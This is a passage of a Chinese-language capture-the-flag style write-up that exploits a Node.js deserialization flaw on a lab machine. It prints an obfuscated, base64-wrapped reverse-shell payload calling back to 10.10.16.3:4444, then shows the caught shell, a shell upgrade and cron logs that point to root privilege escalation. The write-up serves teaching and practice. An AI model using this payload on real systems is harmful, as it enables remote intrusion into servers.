dns">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123; eval(String.fromCharCode(<span class="hljs-number">10,118,97,114</span>,<span class="hljs-number">32,110,101,116</span>,<span class="hljs-number">32,61,32,114</span>,<span class="hljs-number">101,113,117,105</span>,<span class="hljs-number">114,101,40,39</span>,<span class="hljs-number">110,101,116,39</span>,<span class="hljs-number">41,59,10,118</span>,<span class="hljs-number">97,114,32,115</span>,<span class="hljs-number">112,97,119,110</span>,<span class="hljs-number">32,61,32,114</span>,<span class="hljs-number">101,113,117,105</span>,<span class="hljs-number">114,101,40,39</span>,<span class="hljs-number">99,104,105,108</span>,<span class="hljs-number">100,95,112,114</span>,<span class="hljs-number">111,99,101,115</span>,<span class="hljs-number">115,39,41,46</span>,<span class="hljs-number">115,112,97,119</span>,<span class="hljs-number">110,59,10,72</span>,<span class="hljs-number">79,83,84,61</span>,<span class="hljs-number">34,49,48,46</span>,<span class="hljs-number">49,48,46,49</span>,<span class="hljs-number">54,46,51,34</span>,<span class="hljs-number">59,10,80,79</span>,<span class="hljs-number">82,84,61,34</span>,<span class="hljs-number">52,52,52,52</span>,<span class="hljs-number">34,59,10,84</span>,<span class="hljs-number">73,77,69,79</span>,<span class="hljs-number">85,84,61,34</span>,<span class="hljs-number">53,48,48,48</span>,<span class="hljs-number">34,59,10,105</span>,<span class="hljs-number">102,32,40,116</span>,<span class="hljs-number">121,112,101,111</span>,<span class="hljs-number">102,32,83,116</span>,<span class="hljs-number">114,105,110,103</span>,<span class="hljs-number">46,112,114,111</span>,<span class="hljs-number">116,111,116,121</span>,<span class="hljs-number">112,101,46,99</span>,<span class="hljs-number">111,110,116,97</span>,<span class="hljs-number">105,110,115,32</span>,<span class="hljs-number">61,61,61,32</span>,<span class="hljs-number">39,117,110,100</span>,<span class="hljs-number">101,102,105,110</span>,<span class="hljs-number">101,100,39,41</span>,<span class="hljs-number">32,123,32,83</span>,<span class="hljs-number">116,114,105,110</span>,<span class="hljs-number">103,46,112,114</span>,<span class="hljs-number">111,116,111,116</span>,<span class="hljs-number">121,112,101,46</span>,<span class="hljs-number">99,111,110,116</span>,<span class="hljs-number">97,105,110,115</span>,<span class="hljs-number">32,61,32,102</span>,<span class="hljs-number">117,110,99,116</span>,<span class="hljs-number">105,111,110,40</span>,<span class="hljs-number">105,116,41,32</span>,<span class="hljs-number">123,32,114,101</span>,<span class="hljs-number">116,117,114,110</span>,<span class="hljs-number">32,116,104,105</span>,<span class="hljs-number">115,46,105,110</span>,<span class="hljs-number">100,101,120,79</span>,<span class="hljs-number">102,40,105,116</span>,<span class="hljs-number">41,32,33,61</span>,<span class="hljs-number">32,45,49,59</span>,<span class="hljs-number">32,125,59,32</span>,<span class="hljs-number">125,10,102,117</span>,<span class="hljs-number">110,99,116,105</span>,<span class="hljs-number">111,110,32,99</span>,<span class="hljs-number">40,72,79,83</span>,<span class="hljs-number">84,44,80,79</span>,<span class="hljs-number">82,84,41,32</span>,<span class="hljs-number">123,10,32,32</span>,<span class="hljs-number">32,32,118,97</span>,<span class="hljs-number">114,32,99,108</span>,<span class="hljs-number">105,101,110,116</span>,<span class="hljs-number">32,61,32,110</span>,<span class="hljs-number">101,119,32,110</span>,<span class="hljs-number">101,116,46,83</span>,<span class="hljs-number">111,99,107,101</span>,<span class="hljs-number">116,40,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">99,111,110,110</span>,<span class="hljs-number">101,99,116,40</span>,<span class="hljs-number">80,79,82,84</span>,<span class="hljs-number">44,32,72,79</span>,<span class="hljs-number">83,84,44,32</span>,<span class="hljs-number">102,117,110,99</span>,<span class="hljs-number">116,105,111,110</span>,<span class="hljs-number">40,41,32,123</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,118,97,114</span>,<span class="hljs-number">32,115,104,32</span>,<span class="hljs-number">61,32,115,112</span>,<span class="hljs-number">97,119,110,40</span>,<span class="hljs-number">39,47,98,105</span>,<span class="hljs-number">110,47,115,104</span>,<span class="hljs-number">39,44,91,93</span>,<span class="hljs-number">41,59,10,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,99</span>,<span class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,46,119,114</span>,<span class="hljs-number">105,116,101,40</span>,<span class="hljs-number">34,67,111,110</span>,<span class="hljs-number">110,101,99,116</span>,<span class="hljs-number">101,100,33,92</span>,<span class="hljs-number">110,34,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">112,105,112,101</span>,<span class="hljs-number">40,115,104,46</span>,<span class="hljs-number">115,116,100,105</span>,<span class="hljs-number">110,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,115</span>,<span class="hljs-number">116,100,111,117</span>,<span class="hljs-number">116,46,112,105</span>,<span class="hljs-number">112,101,40,99</span>,<span class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,115</span>,<span class="hljs-number">116,100,101,114</span>,<span class="hljs-number">114,46,112,105</span>,<span class="hljs-number">112,101,40,99</span>,<span class="hljs-number">108,105,101,110</span>,<span class="hljs-number">116,41,59,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">115,104,46,111</span>,<span class="hljs-number">110,40,39,101</span>,<span class="hljs-number">120,105,116,39</span>,<span class="hljs-number">44,102,117,110</span>,<span class="hljs-number">99,116,105,111</span>,<span class="hljs-number">110,40,99,111</span>,<span class="hljs-number">100,101,44,115</span>,<span class="hljs-number">105,103,110,97</span>,<span class="hljs-number">108,41,123,10</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,99,108</span>,<span class="hljs-number">105,101,110,116</span>,<span class="hljs-number">46,101,110,100</span>,<span class="hljs-number">40,34,68,105</span>,<span class="hljs-number">115,99,111,110</span>,<span class="hljs-number">110,101,99,116</span>,<span class="hljs-number">101,100,33,92</span>,<span class="hljs-number">110,34,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,99,108,105</span>,<span class="hljs-number">101,110,116,46</span>,<span class="hljs-number">111,110,40,39</span>,<span class="hljs-number">101,114,114,111</span>,<span class="hljs-number">114,39,44,32</span>,<span class="hljs-number">102,117,110,99</span>,<span class="hljs-number">116,105,111,110</span>,<span class="hljs-number">40,101,41,32</span>,<span class="hljs-number">123,10,32,32</span>,<span class="hljs-number">32,32,32,32</span>,<span class="hljs-number">32,32,115,101</span>,<span class="hljs-number">116,84,105,109</span>,<span class="hljs-number">101,111,117,116</span>,<span class="hljs-number">40,99,40,72</span>,<span class="hljs-number">79,83,84,44</span>,<span class="hljs-number">80,79,82,84</span>,<span class="hljs-number">41,44,32,84</span>,<span class="hljs-number">73,77,69,79</span>,<span class="hljs-number">85,84,41,59</span>,<span class="hljs-number">10,32,32,32</span>,<span class="hljs-number">32,125,41,59</span>,<span class="hljs-number">10,125,10,99</span>,<span class="hljs-number">40,72,79,83</span>,<span class="hljs-number">84,44,80,79</span>,<span class="hljs-number">82,84,41,59</span>,<span class="hljs-number">10</span>) )&#125;()&quot;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJyY<span class="hljs-number">2</span>UiOiJfJCRORF<span class="hljs-number">9</span>GVU<span class="hljs-number">5</span>DJCRfZ<span class="hljs-symbol">nVuY3</span>Rpb<span class="hljs-number">24</span>gKCl<span class="hljs-number">7</span>IGV<span class="hljs-number">2</span>YWwoU<span class="hljs-number">3</span>RyaW<span class="hljs-number">5</span><span class="hljs-symbol">nLmZyb21</span>DaGFyQ<span class="hljs-number">29</span>kZSgxMCwxMTgsOTcsMTE<span class="hljs-number">0</span>LDMyLDExMCwxMDEsMTE<span class="hljs-number">2</span>LDMyLDYxLDMyLDEx<span class="hljs-symbol">NCwxMDEsMTEzLDExNywxMDUsMTE0</span>LDEwMSw<span class="hljs-number">0</span>MCwzOSwxMTAsMTAxLDEx<span class="hljs-symbol">NiwzOSw0</span>MSw<span class="hljs-number">1</span>OSwxMCwxMTgsOTcsMTE<span class="hljs-number">0</span>LDMyLDEx<span class="hljs-symbol">NSwxMTIsOTcsMTE5</span>LDExMCwzMiw<span class="hljs-number">2</span>MSwzMiwxMTQsMTAxLDExMywxMTcsMTA<span class="hljs-number">1</span>LDEx<span class="hljs-symbol">NCwxMDEsNDAsMzksOTksMTA0</span>LDEw<span class="hljs-symbol">NSwxMDgsMTAwLDk1</span>LDExMiwxMTQsMTExLDk<span class="hljs-number">5</span>LDEwMSwxMTUsMTE<span class="hljs-number">1</span>LD<span class="hljs-name">M5</span>LDQxLDQ<span class="hljs-number">2</span>LDEx<span class="hljs-symbol">NSwxMTIsOTcsMTE5</span>LDExMCw<span class="hljs-number">1</span>OSwxMCw<span class="hljs-number">3</span>Miw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Myw<span class="hljs-number">4</span><span class="hljs-symbol">NCw2</span>MSwz<span class="hljs-symbol">NCw0</span>OSw<span class="hljs-number">0</span>OCw<span class="hljs-number">0</span><span class="hljs-symbol">Niw0</span>OSw<span class="hljs-number">0</span>OCw<span class="hljs-number">0</span><span class="hljs-symbol">Niw0</span>OSw<span class="hljs-number">1</span><span class="hljs-symbol">NCw0</span><span class="hljs-symbol">Niw1</span>MSwz<span class="hljs-symbol">NCw1</span>OSwxMCw<span class="hljs-number">4</span>MCw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Miw<span class="hljs-number">4</span><span class="hljs-symbol">NCw2</span>MSwz<span class="hljs-symbol">NCw1</span>Miw<span class="hljs-number">1</span>Miw<span class="hljs-number">1</span>Miw<span class="hljs-number">1</span>Miwz<span class="hljs-symbol">NCw1</span>OSwxMCw<span class="hljs-number">4</span><span class="hljs-symbol">NCw3</span>Myw<span class="hljs-number">3</span><span class="hljs-symbol">Nyw2</span>OSw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span><span class="hljs-symbol">NSw4</span><span class="hljs-symbol">NCw2</span>MSwz<span class="hljs-symbol">NCw1</span>Myw<span class="hljs-number">0</span>OCw<span class="hljs-number">0</span>OCw<span class="hljs-number">0</span>OCwz<span class="hljs-symbol">NCw1</span>OSwxMCwxMDUsMTAyLDMyLDQwLDEx<span class="hljs-symbol">NiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1</span>LDExMCwxMDMs<span class="hljs-symbol">NDYsMTEyLDExNCwxMTEsMTE2</span>LDExMSwxMTYsMTIxLDExMiwxMDEs<span class="hljs-symbol">NDYsOTksMTExLDExMCwxMTYsOTcsMTA1</span>LDExMCwxMTUsMzIs<span class="hljs-symbol">NjEsNjEsNjEsMzIsMzksMTE3</span>LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzks<span class="hljs-symbol">NDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1</span>LDExMCwxMDMs<span class="hljs-symbol">NDYsMTEyLDExNCwxMTEsMTE2</span>LDExMSwxMTYsMTIxLDExMiwxMDEs<span class="hljs-symbol">NDYsOTksMTExLDExMCwxMTYsOTcsMTA1</span>LDExMCwxMTUsMzIs<span class="hljs-symbol">NjEsMzIsMTAyLDExNywxMTAsOTksMTE2</span>LDEw<span class="hljs-symbol">NSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2</span>LDEx<span class="hljs-symbol">NywxMTQsMTEwLDMyLDExNiwxMDQsMTA1</span>LDEx<span class="hljs-symbol">NSw0</span><span class="hljs-symbol">NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5</span>LDEwMiw<span class="hljs-number">0</span>MCwxMDUsMTE<span class="hljs-number">2</span>LDQxLDMyLDMzLDYxLDMyLDQ<span class="hljs-number">1</span>LDQ<span class="hljs-number">5</span>LDU<span class="hljs-number">5</span>LDMyLDEy<span class="hljs-symbol">NSw1</span>OSwzMiwxMjUsMTAsMTAyLDEx<span class="hljs-symbol">NywxMTAsOTksMTE2</span>LDEw<span class="hljs-symbol">NSwxMTEsMTEwLDMyLDk5</span>LDQwLDcyLDc<span class="hljs-number">5</span>LDgzLD<span class="hljs-name">g0</span>LDQ<span class="hljs-number">0</span>LDgwLDc<span class="hljs-number">5</span>LDgyLD<span class="hljs-name">g0</span>LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE<span class="hljs-number">0</span>LDMyLDk<span class="hljs-number">5</span>LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIs<span class="hljs-symbol">NjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5</span>LDEw<span class="hljs-symbol">NywxMDEsMTE2</span>LDQwLDQxLDU<span class="hljs-number">5</span>LDEwLDMyLDMyLDMyLDMyLDk<span class="hljs-number">5</span>LDEwOCwxMDUsMTAxLDExMCwxMTYs<span class="hljs-symbol">NDYsOTksMTExLDExMCwxMTAsMTAxLDk5</span>LDEx<span class="hljs-symbol">Niw0</span>MCw<span class="hljs-number">4</span>MCw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Miw<span class="hljs-number">4</span><span class="hljs-symbol">NCw0</span><span class="hljs-symbol">NCwzMiw3</span>Miw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Myw<span class="hljs-number">4</span><span class="hljs-symbol">NCw0</span><span class="hljs-symbol">NCwzMiwxMDIsMTE3</span>LDExMCw<span class="hljs-number">5</span>OSwxMTYsMTA<span class="hljs-number">1</span>LDExMSwxMTAs<span class="hljs-symbol">NDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5</span><span class="hljs-symbol">NywxMTQsMzIsMTE1</span>LDEw<span class="hljs-symbol">NCwzMiw2</span>MSwzMiwxMTUsMTEyLDk<span class="hljs-number">3</span>LDExOSwxMTAs<span class="hljs-symbol">NDAsMzksNDcsOTgsMTA1</span>LDExMCw<span class="hljs-number">0</span><span class="hljs-symbol">NywxMTUsMTA0</span>LD<span class="hljs-name">M5</span>LDQ<span class="hljs-number">0</span>LDkxLDkzLDQxLDU<span class="hljs-number">5</span>LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk<span class="hljs-number">5</span>LDEwOCwxMDUsMTAxLDExMCwxMTYs<span class="hljs-symbol">NDYsMTE5</span>LDEx<span class="hljs-symbol">NCwxMDUsMTE2</span>LDEwMSw<span class="hljs-number">0</span>MCwz<span class="hljs-symbol">NCw2</span><span class="hljs-symbol">NywxMTEsMTEwLDExMCwxMDEsOTksMTE2</span>LDEwMSwxMDAsMzMsOTIsMTEwLD<span class="hljs-name">M0</span>LDQxLDU<span class="hljs-number">5</span>LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk<span class="hljs-number">5</span>LDEwOCwxMDUsMTAxLDExMCwxMTYs<span class="hljs-symbol">NDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1</span>LDEx<span class="hljs-symbol">NiwxMDAsMTA1</span>LDExMCw<span class="hljs-number">0</span>MSw<span class="hljs-number">1</span>OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA<span class="hljs-number">0</span>LDQ<span class="hljs-number">2</span>LDEx<span class="hljs-symbol">NSwxMTYsMTAwLDExMSwxMTcsMTE2</span>LDQ<span class="hljs-number">2</span>LDExMiwxMDUsMTEyLDEwMSw<span class="hljs-number">0</span>MCw<span class="hljs-number">5</span>OSwxMDgsMTA<span class="hljs-number">1</span>LDEwMSwxMTAsMTE<span class="hljs-number">2</span>LDQxLDU<span class="hljs-number">5</span>LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEx<span class="hljs-symbol">NSwxMDQsNDYsMTE1</span>LDEx<span class="hljs-symbol">NiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5</span>LDEwOCwxMDUsMTAxLDExMCwxMTYs<span class="hljs-symbol">NDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1</span>LDEw<span class="hljs-symbol">NCw0</span><span class="hljs-symbol">NiwxMTEsMTEwLDQwLDM5</span>LDEwMSwxMjAsMTA<span class="hljs-number">1</span>LDEx<span class="hljs-symbol">NiwzOSw0</span><span class="hljs-symbol">NCwxMDIsMTE3</span>LDExMCw<span class="hljs-number">5</span>OSwxMTYsMTA<span class="hljs-number">1</span>LDExMSwxMTAs<span class="hljs-symbol">NDAsOTksMTExLDEwMCwxMDEsNDQsMTE1</span>LDEw<span class="hljs-symbol">NSwxMDMsMTEwLDk3</span>LDEwOCw<span class="hljs-number">0</span>MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA<span class="hljs-number">4</span>LDEw<span class="hljs-symbol">NSwxMDEsMTEwLDExNiw0</span><span class="hljs-symbol">NiwxMDEsMTEwLDEwMCw0</span>MCwz<span class="hljs-symbol">NCw2</span>OCwxMDUsMTE<span class="hljs-number">1</span>LDk<span class="hljs-number">5</span>LDExMSwxMTAsMTEwLDEwMSw<span class="hljs-number">5</span>OSwxMTYsMTAxLDEwMCwzMyw<span class="hljs-number">5</span>MiwxMTAsMzQs<span class="hljs-symbol">NDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1</span>LDQxLDU<span class="hljs-number">5</span>LDEwLDMyLDMyLDMyLDMyLDEy<span class="hljs-symbol">NSw0</span>MSw<span class="hljs-number">1</span>OSwxMCwzMiwzMiwzMiwzMiw<span class="hljs-number">5</span>OSwxMDgsMTA<span class="hljs-number">1</span>LDEwMSwxMTAsMTE<span class="hljs-number">2</span>LDQ<span class="hljs-number">2</span>LDExMSwxMTAs<span class="hljs-symbol">NDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0</span><span class="hljs-symbol">NCwzMiwxMDIsMTE3</span>LDExMCw<span class="hljs-number">5</span>OSwxMTYsMTA<span class="hljs-number">1</span>LDExMSwxMTAs<span class="hljs-symbol">NDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4</span><span class="hljs-symbol">NCwxMDUsMTA5</span>LDEwMSwxMTEsMTE<span class="hljs-number">3</span>LDEx<span class="hljs-symbol">Niw0</span>MCw<span class="hljs-number">5</span>OSw<span class="hljs-number">0</span>MCw<span class="hljs-number">3</span>Miw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Myw<span class="hljs-number">4</span><span class="hljs-symbol">NCw0</span><span class="hljs-symbol">NCw4</span>MCw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span>Miw<span class="hljs-number">4</span><span class="hljs-symbol">NCw0</span>MSw<span class="hljs-number">0</span><span class="hljs-symbol">NCwzMiw4</span><span class="hljs-symbol">NCw3</span>Myw<span class="hljs-number">3</span><span class="hljs-symbol">Nyw2</span>OSw<span class="hljs-number">3</span>OSw<span class="hljs-number">4</span><span class="hljs-symbol">NSw4</span><span class="hljs-symbol">NCw0</span>MSw<span class="hljs-number">1</span>OSwxMCwzMiwzMiwzMiwzMiwxMjUs<span class="hljs-symbol">NDEsNTksMTAsMTI1</span>LDEwLDk<span class="hljs-number">5</span>LDQwLDcyLDc<span class="hljs-number">5</span>LDgzLD<span class="hljs-name">g0</span>LDQ<span class="hljs-number">0</span>LDgwLDc<span class="hljs-number">5</span>LDgyLD<span class="hljs-name">g0</span>LDQxLDU<span class="hljs-number">5</span>LDEwKSApfSgpI<span class="hljs-symbol">n0</span>=<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408141824523.png" alt="image-20220408141824523"  /><p>在进行提交时服务端会返回无效的username，但是没关系，可以正常收到反向shell链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.85] 48860<br>Connected!<br>uid<br>/bin/sh: 1: uid: not found<br><span class="hljs-built_in">id</span><br>uid=1000(sun) gid=1000(sun) <span class="hljs-built_in">groups</span>=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br></code></pre></td></tr></table></figure><p>可以检测一下目标有无python环境，一般都是有的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br></code></pre></td></tr></table></figure><p>那我可以升级一下shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>我找到了user.txt:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">sun@sun:~$ find / -name user.txt<br>find / -name user.txt<br>find: ‘/tmp/systemd-private-6285fa43ec854497a6b87d7c1eab3ed8-colord.service-MBDXg2’: Permission denied<br>find: ‘/tmp/vmware-root’: Permission denied<br>find: ‘/tmp/systemd-private-6285fa43ec854497a6b87d7c1eab3ed8-systemd-timesyncd.service-yO3LB8’: Permission denied<br>find: ‘/tmp/systemd-private-6285fa43ec854497a6b87d7c1eab3ed8-rtkit-daemon.service-Yc1yyh’: Permission denied<br>find: ‘/home/sun/.gvfs’: Permission denied<br>find: ‘/home/sun/.cache/dconf’: Permission denied<br>find: ‘/home/sun/.dbus’: Permission denied<br>/home/sun/Documents/user.txt<br>find: ‘/etc/ssl/private’: Permission denied<br>find: ‘/etc/polkit-1/localauthority’: Permission denied<br>find: ‘/etc/cups/ssl’: Permission denied<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sun@sun:~/Documents$ <span class="hljs-built_in">ls</span> -all<br><span class="hljs-built_in">ls</span> -all<br>total 16<br>drwxr-xr-x  2 sun sun 4096 Mar  4  2018 .<br>drwxr-xr-x 21 sun sun 4096 Apr  8 00:47 ..<br>-rw-rw-r--  1 sun sun   29 Sep 21  2017 script.py<br>-rw-rw-r--  1 sun sun   33 Sep 21  2017 user.txt<br></code></pre></td></tr></table></figure><p>在目录中还有一个script.py脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sun@sun:~/Documents$ <span class="hljs-built_in">cat</span> script.py<br><span class="hljs-built_in">cat</span> script.py<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Script is running...&quot;</span><br></code></pre></td></tr></table></figure><p>而在上级目录有一个output.txt中的字符信息与脚本像是存在关联：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sun@sun:~$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>Desktop    Downloads         Music         output.txt  Public     Templates<br>Documents  examples.desktop  node_modules  Pictures    server.js  Videos<br>sun@sun:~$ <span class="hljs-built_in">cat</span> output.txt<br><span class="hljs-built_in">cat</span> output.txt<br>Script is running...<br></code></pre></td></tr></table></figure><p>那我可能需要知道这两个文件之中是否真的存在关联，我可以去看一下系统日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/log<br><br><span class="hljs-built_in">cat</span> syslog<br></code></pre></td></tr></table></figure><p>在日志最底部找到了这样的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apr  8 02:35:01 sun CRON[4992]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>sun@sun:/var/log$ <br></code></pre></td></tr></table></figure><p>在日志内还有一堆相关信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Apr  8 01:45:01 sun CRON[4714]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 01:47:13 sun org.gnome.evolution.dataserver.Sources5[3526]: ** (evolution-source-registry:3807): WARNING **: secret_service_search_sync: must specify at least one attribute to match<br>Apr  8 01:50:01 sun CRON[4744]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 01:55:01 sun CRON[4762]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 02:00:01 sun CRON[4782]: (sun) CMD (nodejs /home/sun/server.js &gt;/dev/null 2&gt;&amp;1)<br>Apr  8 02:00:01 sun CRON[4783]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 02:00:36 sun kernel: [ 4419.527491] perf interrupt took too long (5034 &gt; 5000), lowering kernel.perf_event_max_sample_rate to 25000<br>Apr  8 02:05:01 sun CRON[4806]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="hljs-built_in">touch</span> -d <span class="hljs-string">&quot;<span class="hljs-subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)<br>Apr  8 02:10:01 sun CRON[4825]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="hljs-built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="hljs-built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr 